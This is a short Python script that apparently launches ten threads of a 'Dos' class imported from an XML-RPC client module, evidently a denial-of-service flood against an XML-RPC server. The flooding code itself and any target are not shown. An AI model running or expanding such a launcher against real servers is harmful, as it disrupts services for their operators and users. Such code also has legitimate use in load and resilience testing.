__author__ = 'proSingularity'

from xmlrpc.client import ServerProxy as prox
import random
import threading
import networking.xmlrpc_client_Dos_c as Dos

for i in range(10):
    Dos.Dos().start()